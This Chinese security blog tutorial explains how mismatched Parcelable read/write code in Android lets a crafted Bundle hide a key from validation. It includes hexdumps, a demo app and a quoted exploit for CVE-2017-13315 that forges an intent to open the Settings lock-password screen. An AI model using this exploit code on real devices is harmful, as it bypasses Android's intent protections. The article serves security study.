## Android中的序列化反序列化不匹配导致的漏洞解析

>本文仅供安全技术交流,请勿用于不正当的用途,造成的一切后果与本文作者无关.

### 0x00 前言
上一次提到了[launchAnyWhere](https://github.com/EggUncle/LaunchAnyWhere)这个漏洞,其中提到了修补方案,就是去验证intent指向的app和appB是不是有相同签名的,这里有这样一段:
```
if (result != null
+                    && (intent = result.getParcelable(AccountManager.KEY_INTENT)) != null) {
+                /*
+                 * The Authenticator API allows third party authenticators to
+                 * supply arbitrary intents to other apps that they can run,
+                 * this can be very bad when those apps are in the system like
+                 * the System Settings.
+                 */
+                PackageManager pm = mContext.getPackageManager();
+                ResolveInfo resolveInfo = pm.resolveActivity(intent, 0);
+                int targetUid = resolveInfo.activityInfo.applicationInfo.uid;
+                int authenticatorUid = Binder.getCallingUid();
+                if (PackageManager.SIGNATURE_MATCH !=
+                        pm.checkSignatures(authenticatorUid, targetUid)) {
+                    throw new SecurityException(
+                            "Activity to be started with KEY_INTENT must " +
+                            "share Authenticator's signatures");
+                }
+            }
```
可以看到这里有检查result.getParcelable(AccountManager.KEY_INTENT)是否为空,如果不是,就对他进行检查.那有没有绕过的方法?

有的

### 0x01 背景知识
#### Bundle
直接上官方文档把
>A mapping from String keys to various Parcelable values.

bundle常用在Activity中传递数据,可以传递序列化的对象.

#### Bundle格式
首先我们先说一下如何将bundle信息dump到本地并查看
```
Bundle bundle = new Bundle();
bundle.readFromParcel(targetParcel);
...............

public static void dumpBundle(Parcel parcel, String name) {
    byte[] data = parcel.marshall();
    try {
        FileOutputStream fileOutputStream = new FileOutputStream("/sdcard/" + name + ".data");
        fileOutputStream.write(data);
        fileOutputStream.close();
    } catch (Exception e) {

    }
}
```

我们先生成一个简单的bundle数据再保存到本地
```
Bundle bundle=new Bundle();
      bundle.putInt("intkey",123);
      bundle.putChar("charkey",'a');

      Test test=new Test(1);
      Parcel parcel=Parcel.obtain();
      bundle.putParcelable("testkey",test);
      bundle.writeToParcel(parcel,0);
      byte[] data=parcel.marshall();

dumpBundle(parcel,"test")
```
Test类是实现parcelable接口的类,其中只有一个属性int num;

dump到本地后,可以用hexdump vim或者010editor打开,这里就用hexdump打开了
```
hexdump -C test.data

00000000  f8 00 00 00 42 4e 44 4c  03 00 00 00 07 00 00 00  |....BNDL........|
00000010  74 00 65 00 73 00 74 00  6b 00 65 00 79 00 00 00  |t.e.s.t.k.e.y...|
00000020  04 00 00 00 1c 00 00 00  63 00 6f 00 6d 00 2e 00  |........c.o.m...|
00000030  65 00 67 00 67 00 75 00  6e 00 63 00 6c 00 65 00  |e.g.g.u.n.c.l.e.|
00000040  2e 00 64 00 75 00 6d 00  70 00 62 00 75 00 6e 00  |..d.u.m.p.b.u.n.|
00000050  64 00 6c 00 65 00 2e 00  54 00 65 00 73 00 74 00  |d.l.e...T.e.s.t.|
00000060  00 00 00 00 01 00 00 00  06 00 00 00 69 00 6e 00  |............i.n.|
00000070  74 00 6b 00 65 00 79 00  00 00 00 00 01 00 00 00  |t.k.e.y.........|
00000080  7b 00 00 00 07 00 00 00  63 00 68 00 61 00 72 00  |{.......c.h.a.r.|
00000090  6b 00 65 00 79 00 00 00  15 00 00 00 13 00 00 00  |k.e.y...........|
000000a0  6a 00 61 00 76 00 61 00  2e 00 6c 00 61 00 6e 00  |j.a.v.a...l.a.n.|
000000b0  67 00 2e 00 43 00 68 00  61 00 72 00 61 00 63 00  |g...C.h.a.r.a.c.|
000000c0  74 00 65 00 72 00 00 00  32 00 00 00 ac ed 00 05  |t.e.r...2.......|
000000d0  73 72 00 13 6a 61 76 61  2e 6c 61 6e 67 2e 43 68  |sr..java.lang.Ch|
000000e0  61 72 61 63 74 65 72 34  8b 47 d9 6b 1a 26 78 02  |aracter4.G.k.&x.|
000000f0  00 01 43 00 05 76 61 6c  75 65 78 70 00 61 00 00  |..C..valuexp.a..|
00000100
```
整个数据为小端

f8 00 00 00 是bundle长度<br>
42 4e 44 4c 是bundle的魔数<br>
03 00 00 00 是bundle包含的key-value的数量<br>
07 00 00 00 是第一个键值对的长度,以两个字节为单位<br>
74 00 65 00 73 00 74 00  6b 00 65 00 79 00 即第一个key 内容为testkey
00 00 这个我一直没搞清楚是干嘛的,感觉像是为了对齐
04 00 00 00 代表序列化对象,这个值对应的类型定义在[Parcel.java](http://androidxref.com/8.0.0_r4/xref/frameworks/base/core/java/android/os/Parcel.java)中,这里截取一小段源码:

```
215    // Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.
216    private static final int VAL_NULL = -1;
217    private static final int VAL_STRING = 0;
218    private static final int VAL_INTEGER = 1;
219    private static final int VAL_MAP = 2;
220    private static final int VAL_BUNDLE = 3;
221    private static final int VAL_PARCELABLE = 4;
222    private static final int VAL_SHORT = 5;
223    private static final int VAL_LONG = 6;
224    private static final int VAL_FLOAT = 7;
225    private static final int VAL_DOUBLE = 8;
226    private static final int VAL_BOOLEAN = 9;
227    private static final int VAL_CHARSEQUENCE = 10;
228    private static final int VAL_LIST  = 11;
229    private static final int VAL_SPARSEARRAY = 12;
230    private static final int VAL_BYTEARRAY = 13;
231    private static final int VAL_STRINGARRAY = 14;
232    private static final int VAL_IBINDER = 15;
233    private static final int VAL_PARCELABLEARRAY = 16;
234    private static final int VAL_OBJECTARRAY = 17;
235    private static final int VAL_INTARRAY = 18;
236    private static final int VAL_LONGARRAY = 19;
237    private static final int VAL_BYTE = 20;
238    private static final int VAL_SERIALIZABLE = 21;
239    private static final int VAL_SPARSEBOOLEANARRAY = 22;
240    private static final int VAL_BOOLEANARRAY = 23;
241    private static final int VAL_CHARSEQUENCEARRAY = 24;
242    private static final int VAL_PERSISTABLEBUNDLE = 25;
243    private static final int VAL_SIZE = 26;
244    private static final int VAL_SIZEF = 27;
245    private static final int VAL_DOUBLEARRAY = 28;
```
1c 00 00 00 为序列化的类名的长度,此处为28,因为是两个字节为一个单位,所以这里就是56个字节
63 00 6f 00 6d 00 2e 00<br>
65 00 67 00 67 00 75 00<br>
6e 00 63 00 6c 00 65 00<br>
2e 00 64 00 75 00 6d 00<br>
70 00 62 00 75 00 6e 00<br>
64 00 6c 00 65 00 2e 00<br>
54 00 65 00 73 00 74 00<br>
对应的值为com.egguncle.dumpbundle.Test<br>
00 00 00 00 这四个字节我也没弄清楚作用,但是在每一个键结束之后都有这个,大概是把键值分开?但是下面的char键值对并没有这样<br>
01 00 00 00 这个就是序列化中类的属性的值,此处值为1 <br>
06 00 00 00 第二个键值对的长度<br>
69 00 6e 00 74 00 6b 00 65 00 79 00 这里就是第二个键值对的键内容 intkey<br>
00 00 00 00 又是这个熟悉的四个字节<br>
01 00 00 00 代表内容为int类型<br>
7b 00 00 00 代表值,7b转换成十进制是123<br>
后面就不再分析了,后续在实现的时候会详细分析我们的bundle数据<br>

![](https://github.com/EggUncle/Demo/blob/master/markdownimg/img1.jpeg?raw=true)

### 0x02 示例
我们现在来写一个demo,大致功能是,在MainActivity中,给intent设置一些bundle数据,并启动第二个界面Main2Activity,但是在启动之前做一个检测,当检测到恶意数据的时候,就拒绝启动Main2Activity,但是在界面Main2Activity中,会尝试获取这个键值对并获取它的一些信息,我知道这个场景可能显得比较沙雕...但是我们的重点不是这个,我们的重点是,如何在activity1中绕过这个检测限制?

首先来看一下界面1中的限制的代码,比如说我们要传入的恶意键值对的键是evilkv,值是一个序列化对象,那这里就读取这个键,如果返回值不为空,那就说明键值对存在.
```
private boolean checkBundle(Bundle bundle) {
    if (bundle.getParcelable("evilkv") != null) {
        return false;
    }
    return true;
}
```
我们先尝试一下常规操作,就是将恶意键值对存到bundle里面,在将bundle给intent,看看会怎么样
```
Bundle testBundle=new Bundle();
EvilParcel evilParcel=new EvilParcel("evil data");
testBundle.putParcelable("evilkv",evilParcel);
if (checkBundle(testBundle)){
    Intent intent = new Intent(MainActivity.this, Main2Activity.class);
    intent.putExtras(testBundle);
    startActivity(intent);
}else{
    Log.i(TAG, "there is a evilkv!");
}
```
界面这里就不截图了,就是一个按钮,点击以后执行上面的代码,我们多点几下<br>
![](https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2019-14-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true)

界面2没有启动,而且log也输出了there is a evilkv! 说明还是被检测到了,接下来就是重点了,如何绕过?

### 0x03 利用序列化反序列化不匹配来绕过键值检测
假设这个类里面有这样一个支持序列化的类:
```
public class MyMismatchParcel implements Parcelable {

    private final static String TAG="MYTEST_MyMismatchParcel";

    private int mDataInt;

    public int getmDataInt() {
        return mDataInt;
    }

    protected MyMismatchParcel(Parcel in) {
        readFromParcel(in);
    }

    public static final Creator<MyMismatchParcel> CREATOR = new Creator<MyMismatchParcel>() {
        @Override
        public MyMismatchParcel createFromParcel(Parcel in) {
            return new MyMismatchParcel(in);
        }

        @Override
        public MyMismatchParcel[] newArray(int size) {
            return new MyMismatchParcel[size];
        }
    };

    @Override
    public int describeContents() {
        return 0;
    }

    @Override
    public void writeToParcel(Parcel parcel, int i) {
        parcel.writeLong(mDataInt);
    }

    public void readFromParcel(Parcel in) {
        mDataInt = in.readInt();
    }
}
```
这个类有一个小问题,在序列化和反序列化时,因为一些疏忽,对同一个属性,写时使用了writeLong,读时使用了readInt,这看起来只是一个不起眼的小错误,接下来我们看看如何利用它.

首先先明确一下,由于它的读写过程不匹配,读时为int,即4字节,而写时作为long,为8字节,且bundle为小端,则在一次读写之后,它的后面将会出现四个字节的错位,即 00 00 00 00,如下:

```
00000000  90 00 00 00 42 4e 44 4c  01 00 00 00 06 00 00 00  |....BNDL........|
00000010  6d 00 79 00 74 00 65 00  73 00 74 00 00 00 00 00  |m.y.t.e.s.t.....|
00000020  04 00 00 00 35 00 00 00  63 00 6f 00 6d 00 2e 00  |....5...c.o.m...|
00000030  65 00 67 00 67 00 75 00  6e 00 63 00 6c 00 65 00  |e.g.g.u.n.c.l.e.|
00000040  2e 00 6d 00 69 00 73 00  6d 00 61 00 74 00 63 00  |..m.i.s.m.a.t.c.|
00000050  68 00 70 00 61 00 72 00  63 00 65 00 6c 00 61 00  |h.p.a.r.c.e.l.a.|
00000060  62 00 6c 00 65 00 2e 00  64 00 61 00 74 00 61 00  |b.l.e...d.a.t.a.|
00000070  2e 00 4d 00 79 00 4d 00  69 00 73 00 6d 00 61 00  |..M.y.M.i.s.m.a.|
00000080  74 00 63 00 68 00 50 00  61 00 72 00 63 00 65 00  |t.c.h.P.a.r.c.e.|
00000090  6c 00 00 00 7b 00 00 00                           |l...{...|
```

```
00000000  94 00 00 00 42 4e 44 4c  01 00 00 00 06 00 00 00  |....BNDL........|
00000010  6d 00 79 00 74 00 65 00  73 00 74 00 00 00 00 00  |m.y.t.e.s.t.....|
00000020  04 00 00 00 35 00 00 00  63 00 6f 00 6d 00 2e 00  |....5...c.o.m...|
00000030  65 00 67 00 67 00 75 00  6e 00 63 00 6c 00 65 00  |e.g.g.u.n.c.l.e.|
00000040  2e 00 6d 00 69 00 73 00  6d 00 61 00 74 00 63 00  |..m.i.s.m.a.t.c.|
00000050  68 00 70 00 61 00 72 00  63 00 65 00 6c 00 61 00  |h.p.a.r.c.e.l.a.|
00000060  62 00 6c 00 65 00 2e 00  64 00 61 00 74 00 61 00  |b.l.e...d.a.t.a.|
00000070  2e 00 4d 00 79 00 4d 00  69 00 73 00 6d 00 61 00  |..M.y.M.i.s.m.a.|
00000080  74 00 63 00 68 00 50 00  61 00 72 00 63 00 65 00  |t.c.h.P.a.r.c.e.|
00000090  6c 00 00 00 7b 00 00 00  00 00 00 00              |l...{.......|
```

可以很清楚的看到,最后多了四位,我们的重点就在利用这四字节的偏移.

我们可以在它后面再加上一个键值对,键为6,值的类型为byte,也就是13,将恶意数据拼接在后面,这样我们构造的bundle数据大概如下:

```
|第一个键值对|第二个      |
|mytest| 1 |6|13|evilkv|
而在一次不匹配的序列化反序列化之后,它会变成这样
|第一个键值对|第二个     |第三个
|mytest| 1 | 0 | 6 |13|evilkv
```
这里只是一个粗略的示意,在不匹配的序列化反序列化发生之后,第二个键值对的键,变为了空,而它的值变为了 6 13 这里的6其实代表long型,然后13就是它的值,后面其实还有byte的长度信息,这里会一并被当成第二个键的值,而这个时候,第三个键,也就是我们藏起来的那个,就出现了,这样就能在check的时候绕过,下面我们通过代码来构造它:

```
Parcel parcel = Parcel.obtain();
   String evilData = "evil data";
   //键值对的数量,为3,这里其实有构建四个键值对,存在不匹配问题的类的键值对,用来隐藏恶意键值对的键值对,恶意键值对,还有一个占坑
   //的键值对,这里给设置为三,因为在隐藏的键值对被还原的时候,隐藏的键值对就是第三个,如果设置为2,那么就读不到了
   parcel.writeInt(3);  
   //parcel.writeInt(1);
   //第一个键
   //第一个键的内容
   parcel.writeString("mytest");
   //值的类型 4 代表序列化对象
   parcel.writeInt(4);
   //对应的类
   parcel.writeString("com.egguncle.mismatchparcelable.data.MyMismatchParcel");
   //写入数据
   parcel.writeInt(123);


   //第二个键的键值长度
   parcel.writeInt(1);
   //第二个键的键值
   parcel.writeInt(6);
   //代表值为 byte类型
   parcel.writeInt(13);

   //占个坑,一会儿回来给它写上咱们evil kv的,这里代表byte的长度
   parcel.writeInt(-1);

   int keyIntentStartPos = parcel.dataPosition();
   parcel.writeString("evilkv");
   //值的类型
   parcel.writeInt(4);
   //对应的类
   parcel.writeString("com.egguncle.mismatchparcelable.data.EvilParcel");
   //写入数据
   parcel.writeString(evilData);

   int keyIntentEndPos = parcel.dataPosition();
   int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
   // backpatch length of evilkv,回到前面那个-1处,把恶意键值对填上
   parcel.setDataPosition(keyIntentStartPos - 4);  
   parcel.writeInt(lengthOfKeyIntent);
   //回到末尾,继续写第三个键值对
   parcel.setDataPosition(keyIntentEndPos);


   //因为最后恶意kv被取出来以后,,bundle实际上就有了三个kv(在不算最后这一个的情况下)
   // 第三个kv就是我们的恶意kv,而bundle的数量只能大不能小不然就读不到第三个了
   parcel.writeString("Padding-Key");
   parcel.writeInt(0); // VAL_STRING
   parcel.writeString("Padding-Value");

   Parcel targetParcel = Parcel.obtain();
   int length = parcel.dataSize();
   targetParcel.writeInt(length);
   targetParcel.writeInt(0x4c444E42);
   targetParcel.appendFrom(parcel, 0, length);
   targetParcel.setDataPosition(0);

   Bundle bundle = new Bundle();
   bundle.setClassLoader(getClass().getClassLoader());
   bundle.readFromParcel(targetParcel);

   MyFileUtil.dumpBundle(targetParcel, "test1");

   if (checkBundle(bundle)){
       Intent intent = new Intent(MainActivity.this, Main2Activity.class);
       intent.putExtras(bundle);
       startActivity(intent);
   }else{
       Log.i(TAG, "there is a evilkv!");
   }


```
现在运行代码来看一下结果
![](https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2022-02-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true)

可以看到我们的数据确实是有了,绕过了界面1中的检测,也在界面2中成功读到了数据,我们再来看一下这两次的bundle数据
![](https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2022-05-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true)

可以看到在00000090这一行,由于不匹配的读写,导致错位了四位,第二个键值对被当成了键为空,值为long型,内容为940000000d,这就是上面截图输出里面的635655159821的十六进制表示

### 0x04实战 CVE-2017-13315
上次我们提到了launchanywhere这个漏洞,现在我们来利用这次提到的知识点来绕过修复之后的限制.
在CVE-2017-13315这个漏洞中,出现问题的类是DcParamObject,它出现的问题和上面的例子一样,在写时将数据以long形式写入,但是读的时候是int
```
public void writeToParcel(Parcel dest, int flags) {
    dest.writeInt(mSubId);
}
private void readFromParcel(Parcel in) {
    mSubId = in.readInt();
}
```
所以利用的方法,和上面的一样的,只是我们的evilkv,需要构造成指定想要跳转的目标页面,这里以设置pin码为例,和以前的launchanywhere例子一样,重置pin码
```
Bundle evilBundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        // Manipulate the raw data of bundle Parcel
        // Now we replace this right Parcel data to evil Parcel data
        pcelData.writeInt(3); // number of elements in ArrayMap
        /*****************************************/
        // mismatched object
        pcelData.writeString("mismatch");
        pcelData.writeInt(4); // VAL_PACELABLE
        pcelData.writeString("com.android.internal.telephony.DcParamObject"); // name of Class Loader
        pcelData.writeInt(1);//mSubId

        pcelData.writeInt(1);
        pcelData.writeInt(6);
        pcelData.writeInt(13);
        //pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent
        pcelData.writeInt(-1); // dummy, will hold the length
        int keyIntentStartPos = pcelData.dataPosition();
        // Evil object hide in ByteArray
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent");// name of Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri is null
        pcelData.writeString(null); // mType is null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage is null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos = pcelData.dataPosition();
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
        pcelData.setDataPosition(keyIntentStartPos - 4);  // backpatch length of KEY_INTENT
        pcelData.writeInt(lengthOfKeyIntent);
        pcelData.setDataPosition(keyIntentEndPos);
        Log.d(TAG, "Length of KEY_INTENT is " + Integer.toHexString(lengthOfKeyIntent));

        ///////////////////////////////////////
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0); // VAL_STRING
        pcelData.writeString("Padding-Value"); //


        int length  = pcelData.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evilBundle.readFromParcel(bndlData);
        Log.d(TAG, evilBundle.toString());
       return evilBundle;
```
这一段的出处是http://www.droidsec.cn/bundle%E9%A3%8E%E6%B0%B4-android%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/
这篇文章,因为我们的重点在于讲解原理,所以实战部分,就不自己做了,有兴趣的朋友可以自行尝试.

其实这里是有限制的,仍然会让你先确认pin码,qq支付宝等等带着手势锁定功能的我都试了试,其实都是有做限制的,会先让你确认现在的密码,大多数应用都会有类似的安全策略吧,这里也不谈不正当用途了.

![](https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-15%2022-27-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true)
